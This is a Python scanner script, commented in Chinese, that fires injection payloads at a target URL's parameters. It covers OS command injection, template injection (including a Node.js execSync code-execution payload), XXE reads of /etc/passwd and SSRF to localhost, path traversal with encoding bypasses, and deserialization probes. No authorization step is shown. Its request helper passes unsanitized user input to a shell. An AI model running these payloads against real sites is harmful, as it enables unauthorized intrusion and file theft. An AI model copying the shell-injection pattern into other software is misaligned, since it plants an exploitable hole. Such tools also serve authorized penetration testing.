#!/usr/bin/env python3
"""
RCE Scanner - 命令注入/SSTI/XXE/反序列化快速检测

用法:
  src-rce-scanner.py <url>                          # 自动检测
  src-rce-scanner.py <url> --param cmd,exec         # 指定参数
  src-rce-scanner.py <url> --method POST --data 'cmd=ls'
  src-rce-scanner.py <url> --type ssti              # 仅测SSTI
  src-rce-scanner.py <url> --type xxe               # 仅测XXE
  src-rce-scanner.py <url> --type cmdi              # 仅测命令注入

覆盖:
  - 命令注入: OS命令执行(|, ;, ``, $())
  - SSTI: 服务端模板注入(Jinja2/Twig/FreeMarker/Pebble/Velocity)
  - XXE: XML外部实体注入
  - 反序列化: Java/PHP/.NET反序列化检测
  - 路径遍历: 目录穿越(../)
  - 文件包含: LFI/RFI
"""

import argparse
import hashlib
import subprocess
import sys
import time
import urllib.parse


def req(url, method="GET", data=None, cookie=None, headers=None, timeout=10, body=None):
    """Send HTTP request."""
    cmd = f"curl -sk --max-time {timeout} -D /tmp/rce_hdr.txt -o /tmp/rce_body.txt -w '%{{http_code}}|%{{time_total}}' "
    if method == "POST":
        if body:
            cmd += "-X POST --data-binary @- "
        elif data:
            cmd += f"-X POST -d '{data}' "
    if cookie:
        cmd += f"-b '{cookie}' "
    if headers:
        for h in headers:
            cmd += f"-H '{h}' "
    cmd += f"'{url}'"

    try:
        if body:
            r = subprocess.run(cmd, shell=True, input=body, capture_output=True, text=True, timeout=timeout+5)
        else:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout+5)
        output = r.stdout.strip()
        parts = output.split('|')
        status = parts[0] if parts else ''
        resp_time = float(parts[1]) if len(parts) > 1 else 0

        with open('/tmp/rce_hdr.txt', 'r') as f:
            hdr = f.read()
        with open('/tmp/rce_body.txt', 'r') as f:
            resp_body = f.read()

        return status, hdr, resp_body, resp_time
    except Exception:
        return '', '', '', 0


def inject(url, param, payload, method="GET", data=None):
    """Inject payload into parameter."""
    if method == "GET":
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if param in qs:
            qs[param] = [payload]
        new_query = urllib.parse.urlencode(qs, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query)), None
    else:
        if data:
            params = urllib.parse.parse_qs(data, keep_blank_values=True)
            if param in params:
                params[param] = [payload]
            return url, urllib.parse.urlencode(params, doseq=True)
    return url, data


def detect_params(url, method="GET", data=None):
    """Detect parameters."""
    params = []
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query)
    for p in qs:
        params.append(p)
    if data:
        post_params = urllib.parse.parse_qs(data)
        for p in post_params:
            if p not in params:
                params.append(p)
    return params


def test_command_injection(url, param, method="GET", data=None, cookie=None):
    """Test for OS command injection."""
    results = []
    marker = f"rce{int(time.time())}"

    # Get baseline
    _, _, baseline_body, _ = req(url, method, data, cookie)
    baseline_hash = hashlib.md5(baseline_body.encode()).hexdigest()[:16]

    payloads = [
        # Direct command execution
        (f"|echo {marker}", f"echo {marker}", "管道符注入"),
        (f";echo {marker}", f"echo {marker}", "分号注入"),
        (f"`echo {marker}`", f"echo {marker}", "反引号注入"),
        (f"$(echo {marker})", f"echo {marker}", "美元括号注入"),
        # With original value preservation
        (f"1|echo {marker}", f"echo {marker}", "管道符+原值"),
        (f"1;echo {marker}", f"echo {marker}", "分号+原值"),
        # Newline injection
        (f"1%0aecho {marker}", f"echo {marker}", "换行注入"),
        # Time-based (if output not reflected)
        ("|sleep 5", "sleep 5", "时间盲注(管道)"),
        (";sleep 5", "sleep 5", "时间盲注(分号)"),
    ]

    for payload, expected_output, desc in payloads:
        test_url, test_data = inject(url, param, payload, method, data)

        if 'sleep' in payload:
            t0 = time.time()
            req(test_url, method, test_data, cookie, timeout=15)
            elapsed = time.time() - t0
            if elapsed >= 4:
                results.append({
                    "type": "command_injection",
                    "param": param,
                    "payload": payload,
                    "desc": desc,
                    "evidence": f"延迟{elapsed:.1f}s",
                    "confidence": "HIGH"
                })
                break
        else:
            status, _, body, _ = req(test_url, method, test_data, cookie)
            if marker in body:
                results.append({
                    "type": "command_injection",
                    "param": param,
                    "payload": payload,
                    "desc": desc,
                    "evidence": f"输出包含{marker}",
                    "confidence": "CRITICAL"
                })
                break

    return results


def test_ssti(url, param, method="GET", data=None, cookie=None):
    """Test for Server-Side Template Injection."""
    results = []

    # Mathematical expressions (output should change)
    math_payloads = [
        ("{{7*7}}", "49", "Jinja2/Twig通用"),
        ("${7*7}", "49", "FreeMarker/Velocity"),
        ("#{7*7}", "49", "Pebble"),
        ("{{7*'7'}}", "7777777", "Jinja2字符串重复"),
        ("<%= 7*7 %>", "49", "ERB/Ruby"),
        ("{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('echo RCE_MARKER')}}", "RCE_MARKER", "Jinja2 RCE(Node.js)"),
    ]

    # Get baseline
    _, _, baseline_body, _ = req(url, method, data, cookie)

    for payload, expected, desc in math_payloads:
        test_url, test_data = inject(url, param, payload, method, data)
        status, _, body, _ = req(test_url, method, test_data, cookie)

        if expected in body and expected not in baseline_body:
            results.append({
                "type": "ssti",
                "param": param,
                "payload": payload,
                "desc": desc,
                "evidence": f"响应包含{expected}",
                "confidence": "CRITICAL" if "RCE" in desc else "HIGH"
            })
            break

    return results


def test_xxe(url, param, method="GET", data=None, cookie=None):
    """Test for XML External Entity injection."""
    results = []

    # Only test if content-type suggests XML
    xxe_payloads = [
        # Basic XXE
        ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>''', "root:", "文件读取(/etc/passwd)"),

        # PHP wrapper
        ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root>&xxe;</root>''', "cm9vd", "PHP Base64读取"),

        # SSRF via XXE
        ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]>
<root>&xxe;</root>''', "", "SSRF(内网探测)"),
    ]

    for payload, marker, desc in xxe_payloads:
        status, hdr, body, _ = req(url, method, data, cookie,
                                     headers=["Content-Type: application/xml"],
                                     body=payload)

        if marker and marker in body:
            results.append({
                "type": "xxe",
                "param": param,
                "desc": desc,
                "evidence": body[:200],
                "confidence": "CRITICAL"
            })
            break

    return results


def test_path_traversal(url, param, method="GET", data=None, cookie=None):
    """Test for path traversal / LFI."""
    results = []

    # Get baseline
    _, _, baseline_body, _ = req(url, method, data, cookie)

    payloads = [
        ("../../../etc/passwd", "root:", "Linux /etc/passwd"),
        ("..\\..\\..\\windows\\win.ini", "[windows]", "Windows win.ini"),
        ("....//....//....//etc/passwd", "root:", "双写绕过"),
        ("..%252f..%252f..%252fetc/passwd", "root:", "URL编码绕过"),
        ("..%c0%af..%c0%af..%c0%afetc/passwd", "root:", "Unicode绕过"),
        ("/etc/passwd%00", "root:", "空字节截断"),
        ("php://filter/convert.base64-encode/resource=/etc/passwd", "cm9vd", "PHP包装器"),
        ("file:///etc/passwd", "root:", "file://协议"),
    ]

    for payload, marker, desc in payloads:
        test_url, test_data = inject(url, param, payload, method, data)
        status, _, body, _ = req(test_url, method, test_data, cookie)

        if marker in body and marker not in baseline_body:
            results.append({
                "type": "path_traversal",
                "param": param,
                "payload": payload,
                "desc": desc,
                "evidence": body[:200],
                "confidence": "HIGH"
            })
            break

    return results


def test_deserialization(url, param, method="GET", data=None, cookie=None):
    """Test for deserialization vulnerabilities."""
    results = []

    # Java deserialization markers
    java_payloads = [
        ("rO0ABX", "Java序列化(Base64)"),
        ("aced0005", "Java序列化(十六进制)"),
    ]

    # PHP deserialization markers
    php_payloads = [
        ("O:8:\"stdClass\"", "PHP序列化对象"),
    ]

    # Check if parameter accepts serialized data
    _, _, baseline_body, _ = req(url, method, data, cookie)

    # Test with Java serialized object header
    import base64
    java_obj = base64.b64encode(b'\xac\xed\x00\x05').decode()
    test_url, test_data = inject(url, param, java_obj, method, data)
    status, _, body, _ = req(test_url, method, test_data, cookie)

    if 'error' in body.lower() and ('serial' in body.lower() or 'class' in body.lower() or 'object' in body.lower()):
        results.append({
            "type": "deserialization",
            "param": param,
            "desc": "可能接受Java序列化对象",
            "evidence": body[:200],
            "confidence": "LOW"
        })

    return results


def main():
    parser = argparse.ArgumentParser(description="RCE Scanner - 命令注入/SSTI/XXE检测")
    parser.add_argument("url", help="目标URL")
    parser.add_argument("--param", "-p", help="指定参数(逗号分隔)")
    parser.add_argument("--method", "-m", default="GET", help="HTTP方法")
    parser.add_argument("--data", "-d", help="POST数据")
    parser.add_argument("--cookie", "-c", help="Cookie")
    parser.add_argument("--type", "-t", choices=["cmdi", "ssti", "xxe", "lfi", "deser", "all"], default="all", help="测试类型")
    parser.add_argument("--timeout", type=int, default=10, help="超时")
    args = parser.parse_args()

    url = args.url
    method = args.method.upper()
    data = args.data
    cookie = args.cookie
    test_type = args.type

    print("[*] RCE Scanner")
    print(f"[*] 目标: {url}")
    print(f"[*] 测试类型: {test_type}")
    print()

    # Detect parameters
    if args.param:
        params = args.param.split(',')
    else:
        params = detect_params(url, method, data)
        if not params:
            print("[!] 未发现参数，请用 --param 指定")
            sys.exit(1)
        print(f"[*] 自动检测到参数: {', '.join(params)}")

    all_findings = []

    for param in params:
        print(f"\n[*] 测试参数: {param}")

        tests = []
        if test_type in ("cmdi", "all"):
            tests.append(("命令注入", lambda: test_command_injection(url, param, method, data, cookie)))
        if test_type in ("ssti", "all"):
            tests.append(("SSTI", lambda: test_ssti(url, param, method, data, cookie)))
        if test_type in ("lfi", "all"):
            tests.append(("路径遍历/LFI", lambda: test_path_traversal(url, param, method, data, cookie)))
        if test_type in ("xxe", "all"):
            tests.append(("XXE", lambda: test_xxe(url, param, method, data, cookie)))
        if test_type in ("deser", "all"):
            tests.append(("反序列化", lambda: test_deserialization(url, param, method, data, cookie)))

        for name, test_fn in tests:
            print(f"  [{name}]...")
            findings = test_fn()
            if findings:
                for f in findings:
                    print(f"  [!] {name}: {f['desc']} (置信度: {f['confidence']})")
                    if 'payload' in f:
                        print(f"      Payload: {f['payload'][:80]}")
                    print(f"      证据: {f['evidence'][:80]}")
                all_findings.extend(findings)
            else:
                print("  [-] 未检测到")

    # Summary
    print()
    print("=" * 60)
    if all_findings:
        print(f"[!] 发现 {len(all_findings)} 个高危漏洞!")
        for f in all_findings:
            print(f"\n  类型: {f['type']}")
            print(f"  参数: {f['param']}")
            print(f"  描述: {f['desc']}")
            print(f"  置信度: {f['confidence']}")
    else:
        print("[*] 未检测到命令注入/SSTI/XXE/LFI")
    print("=" * 60)


if __name__ == "__main__":
    main()
